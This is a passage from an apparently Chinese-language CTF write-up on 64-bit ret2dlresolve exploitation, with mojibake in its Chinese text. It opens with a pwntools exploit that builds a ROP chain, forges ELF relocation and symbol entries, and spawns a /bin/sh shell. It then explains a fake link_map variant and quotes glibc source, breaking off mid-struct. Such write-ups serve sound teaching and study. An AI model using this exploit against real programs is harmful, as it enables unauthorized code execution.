ˆä¼šè¿›è¡Œpop</span></span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">link_map_addr=u64(rv(io,<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;link_map_addr : &#x27;</span>+<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx ä¸ºäº†åé¢è·³è½¬åšåç§»</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#è¿”å›åå¯¹æ ˆä¼šè¿›è¡Œpop</span></span><br><span class="line">payload+=p64(pop_rbp_ret)<span class="comment">#æ ˆåŠ«æŒé˜²æ­¢ç¯å¢ƒå˜é‡è¢«ç ´å</span></span><br><span class="line">payload+=p64(fake_stack)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sla(io,<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_base_addr=fake_stack+<span class="number">0x100</span><span class="comment">#Elf64_Relaéœ€è¦ä¸€å—åœ°å€å­˜æ”¾å®ƒ</span></span><br><span class="line">fake_write_Elf64_Sym_base_addr=fake_stack+<span class="number">0x180</span><span class="comment">#Elf64_Syméœ€è¦ä¸€å—åœ°å€å­˜æ”¾å®ƒ</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">0x200</span><span class="comment">#å­—ç¬¦ä¸²çš„åœ°å€</span></span><br><span class="line">binsh_addr=fake_stack+<span class="number">0x208</span><span class="comment">#/bin/sh\x00çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">rel_plt_align=<span class="number">0x18</span>-(fake_write_Elf64_Rela_base_addr-rel_plt_addr)%<span class="number">0x18</span><span class="comment">#ç»“æ„ä½“çš„å¯¹é½å¡«å……å­—èŠ‚ï¼Œç»“æ„ä½“å¤§å°ä¸º0x18</span></span><br><span class="line">rel_sym_align=<span class="number">0x18</span>-(fake_write_Elf64_Sym_base_addr-dynsym_addr)%<span class="number">0x18</span><span class="comment">#åŒä¸Š</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_addr=fake_write_Elf64_Rela_base_addr+rel_plt_align<span class="comment">#Elf64_Relaåœ°å€</span></span><br><span class="line">fake_write_Elf64_Sym_addr=fake_write_Elf64_Sym_base_addr+rel_sym_align<span class="comment">#Elf64_Symåœ°å€</span></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=(fake_write_Elf64_Rela_addr-rel_plt_addr)/<span class="number">0x18</span> <span class="comment">#ä¼ªé€ çš„reloc_arg</span></span><br><span class="line">fake_info=(((fake_write_Elf64_Sym_addr-dynsym_addr)/<span class="number">0x18</span>)&lt;&lt;<span class="number">0x20</span>)|<span class="number">0x7</span> <span class="comment">#ä¼ªé€ r_infoï¼Œåç§»è¦è®¡ç®—æˆä¸‹æ ‡ï¼Œéœ€è¦é™¤ä»¥Elf64_Symçš„å¤§å°ä¸”è¦ä¿è¯æœ€åä¸€å­—èŠ‚ä¸º0x7</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela =p64(write_got)</span><br><span class="line">fake_write_Elf64_Rela+=p64(fake_info)</span><br><span class="line">fake_write_Elf64_Rela+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Sym =p32(fake_st_name)</span><br><span class="line">fake_write_Elf64_Sym+=p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ”¹å†™l_info[VERSYMIDX(DT_VERSYM)] </span></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx ä¸ºäº†åé¢è·³è½¬åšåç§»</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_addr+<span class="number">0x1c8</span>)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#è¿”å›åå¯¹æ ˆä¼šè¿›è¡Œpop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨system</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(plt_0)</span><br><span class="line">payload+=p64(fake_write_reloc_age)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ è™šå‡çš„é‡å®šä½è¡¨é¡¹</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_plt_align</span><br><span class="line">payload+=fake_write_Elf64_Rela</span><br><span class="line">payload =payload.ljust(<span class="number">0x180</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ è™šå‡çš„ç¬¦å·è¡¨é¡¹</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_sym_align</span><br><span class="line">payload+=fake_write_Elf64_Sym</span><br><span class="line">payload =payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ„é€ è™šå‡çš„å­—ç¬¦ä¸²</span></span><br><span class="line">payload+=<span class="string">&#x27;system\x00\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64ä½ä¸‹ä¼ªé€ fake-link-mapè¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROä¸”æ— éœ€æ³„éœ²åœ°å€ï¼‰"><a href="#64ä½ä¸‹ä¼ªé€ fake-link-mapè¿›è¡Œæ”»å‡»ï¼ˆPartial-RELROä¸”æ— éœ€æ³„éœ²åœ°å€ï¼‰" class="headerlink" title="64ä½ä¸‹ä¼ªé€ fake link_mapè¿›è¡Œæ”»å‡»ï¼ˆPartial RELROä¸”æ— éœ€æ³„éœ²åœ°å€ï¼‰"></a>64ä½ä¸‹ä¼ªé€ fake link_mapè¿›è¡Œæ”»å‡»ï¼ˆPartial RELROä¸”æ— éœ€æ³„éœ²åœ°å€ï¼‰</h3><p>ä¸Šé¢çš„æ”»å‡»æ–¹å¼éœ€è¦æ³„éœ²åœ°å€ï¼Œä½†å¯ä»¥æ³„éœ²åœ°å€çš„è¯å¯èƒ½ä¸Šé¢çš„æ”»å‡»å°±ä¼šæ˜¾å¾—éå¸¸ç¹çï¼Œæ²¡æœ‰å¿…è¦ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¦ä¸€ç§æ”»å‡»æ–¹å¼æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œæˆ‘ä»¬ä¹‹å‰çš„æ”»å‡»æ€è·¯è¿˜æœ‰ä¸€ç§æ²¡æœ‰ä½¿ç”¨ï¼Œå¯¹link_mapè¿›è¡Œä¼ªé€ è¿›è¡Œæ”»å‡»</p><p>æˆ‘ä»¬å†å›çœ‹ä¹‹å‰çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ²¡æœ‰å¤ªå…³æ³¨è¿™é‡Œçš„elseåˆ†æ”¯ï¼ŒDL_FIXUP_MAKE_VALUEå‡½æ•°æ˜¯æ¥å¯»æ‰¾å‡½æ•°çš„çœŸå®åœ°å€ï¼Œæˆ‘ä»¬åªè¦è®©**(sym-&gt;st_other)&amp;0x03 == 0**ä¸æˆç«‹ï¼Œè®©å‡½æ•°è¿›å…¥ä¸‹é¢çš„elseè¯­å¥ï¼Œå¹¶ä¸”è®© l-&gt;l_addr + sym-&gt;st_valueæŒ‡å‘systemå‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬è‚¯å®šä¸çŸ¥é“systemçš„çœŸå®åœ°å€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥<strong>å…ˆå°†l-&gt;l_addrå’Œsym-&gt;st_valueå…¶ä¸­ ä¹‹ä¸€è½åœ¨gotè¡¨çš„æŸä¸ªå·²è§£æçš„å‡½æ•°ä¸Šï¼Œå¦ä¸€ä¸ªè®¾ç½®ä¸ºsystemå‡½æ•°å’Œè¿™ä¸ªå‡½æ•° çš„åç§»å€¼</strong>ã€‚æ—¢ç„¶æˆ‘ä»¬éƒ½ä¼ªé€ äº†link_mapï¼Œé‚£ä¹ˆæ˜¾ç„¶l_addræ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œsymæ ¹æ®æˆ‘ä»¬ä¸Šé¢çš„æºç åˆ†æï¼Œ å®ƒçš„å€¼æœ€ç»ˆä¹Ÿæ˜¯ä»link_mapä¸­è·å¾—çš„ã€‚åªè¦æˆ‘ä»¬æ§åˆ¶äº†link_mapï¼Œl-&gt;l_addrå’Œsym-&gt;st_valueå°±æ˜¯å¯æ§çš„ã€‚å½“æˆ‘ä»¬çŸ¥é“äº†libcç‰ˆæœ¬ï¼Œå°±å¯ä»¥å¾—åˆ°systemçš„åœ°å€ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è®©sym-&gt;st_valueè½åœ¨æŸä¸ªå·²ç»è§£æè¿‡çš„gotè¡¨ä¸Šã€‚é‚£ä¹ˆsymçš„åœ°å€å°±æ˜¯è¿™ä¸ªgotè¡¨é¡¹çš„åœ°å€å‡å»8ï¼Œè¿™æ—¶<strong>åªè¦ä¿è¯symçš„åœ°å€ä¸Šçš„å‡½æ•°ä¹Ÿæ˜¯å·²ç»è§£æè¿‡çš„æ­¤æ—¶sym-&gt;st_otherä¸€èˆ¬ä¸º0x7f,å¦‚æ­¤å°±å¯ä»¥ä¿è¯(sym-&gt;st_other)&amp;0x03 != 0</strong>ï¼Œå¦‚æœsymä¸æ˜¯å¯¹åº”ç€å¦ä¸€ä¸ªå‡½æ•°çš„gotè¡¨ï¼Œå°±éœ€è¦ç¡®ä¿ï¼ˆ*(sym+5))&amp;0x03 != 0</p><p>å‰©ä¸‹çš„å°±æ˜¯ä¿è¯l-&gt;l_addræ˜¯æˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œä½†åˆæ²¡æ³•æ³„éœ²libcï¼Œè¿™æ ·æˆ‘ä»¬å°±è¦æ§åˆ¶ç¬¦å·è¡¨symtabä»¥åŠreloc-&gt;r_info,æ‰€ä»¥æˆ‘ä»¬å¾—<strong>ä¼ªé€  DT_SYMTAB, DT_JMPREL</strong>ï¼Œæˆ‘ä»¬å¾—ä¼ªé€ strtabä¸ºå¯è¯»åœ°å€ï¼Œæ‰€ä»¥è¿˜å¾—ä¼ªé€ <strong>DT_STRTAB</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<strong>ä¼ªé€ link_mapå‰0xf8ä¸ªå­—èŠ‚çš„æ•°æ®</strong>ï¼Œéœ€è¦å…³æ³¨çš„åˆ†åˆ«æ˜¯ä½äº<strong>link_map+0çš„l_addrï¼Œä½äºlink_map+0x68çš„ DT_STRTABæŒ‡é’ˆï¼Œä½äºlink_map+0x70çš„DT_SYMTABæŒ‡é’ˆå’Œä½äºlink_map+0xF8çš„DT_JMPRELæŒ‡é’ˆ</strong>ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦<strong>ä¼ªé€ Elf64_Symç»“æ„ä½“ï¼ŒElf64_Relaç»“æ„ä½“</strong>ï¼Œç”±äºDT_JMPRELæŒ‡å‘çš„æ˜¯<strong>Elf64_Dynç»“æ„ä½“</strong>ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦ ä¼ªé€ ä¸€ä¸ªè¿™æ ·çš„ç»“æ„ä½“ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬å¾—è®©reloc_offsetä¸º0.ä¸ºäº†ä¼ªé€ çš„æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©è®©l-&gt;l_addr ä¸ºå·²è§£æå‡½æ•°å†…å­˜åœ°å€å’Œsystemçš„åç§»ï¼Œsym-&gt;st_valueä¸ºå·²è§£æçš„å‡½æ•°åœ°å€çš„æŒ‡é’ˆ-8ï¼Œå³å…¶gotè¡¨é¡¹-8.</p><p>æˆ‘ä»¬å†çœ‹çœ‹link_mapçš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰åœ¨*/include/link.h*</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Structure describing a loaded shared object.  The `l_next&#x27; and `l_prev&#x27;</span></span><br><span class="line"><span class="comment">   members form a chain of all the shared objects loaded at startup.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These data structures exist in space used by the run-time dynamic linker;</span></span><br><span class="line"><span class="comment">   modifying them may have disastrous results.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This data structure might change in future, if necessary.  User-level</span></span><br><span class="line"><span class="comment">   programs must avoid defining objects of this type.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">      the l_libname list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">   without associated file.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">       should be called on this link map</span></span><br><span class="line"><span class="comment">       when relocation finishes.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">   since it is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">    all.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment"> during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment"> contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment"> libraries.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">       the dummy malloc in ld.so.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">      <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">      &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span 